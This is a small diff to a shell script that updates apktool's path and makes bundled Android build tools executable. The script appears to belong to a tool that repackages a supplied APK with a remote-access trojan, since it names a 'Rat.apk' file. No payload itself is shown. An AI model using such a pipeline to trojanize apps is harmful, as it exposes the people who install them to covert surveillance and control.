@@ -24,7 +24,7 @@ DEX2JAR=d2j-dex2jar
 UNZIP=unzip
 KEYTOOL=keytool
 JARSIGNER=jarsigner
-APKTOOL=apktool
+APKTOOL=third-party/apktool2.2.2/apktool
 PROGUARD=third-party/proguard5.3.2/lib/proguard
 DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
 ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
@@ -35,6 +35,13 @@ RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
 proconf=$MY_PATH/android.pro
 TIME_OF_RUN=`date`
+
+#setting permissions
+chmod +x $MY_PATH/third-party/apktool2.2.2/apktool
+chmod +x $MY_PATH/third-party/proguard5.3.2/lib/proguard
+chmod +x $MY_PATH/third-party/android-sdk-linux/build-tools/25.0.2/dx
+chmod +x $MY_PATH/third-party/android-sdk-linux/build-tools/25.0.2/zipalign
+
 # for functions
 FUNC_RESULT=""
 cp $1 $MY_PATH/app.apk >>$LOG_FILE 2>&1
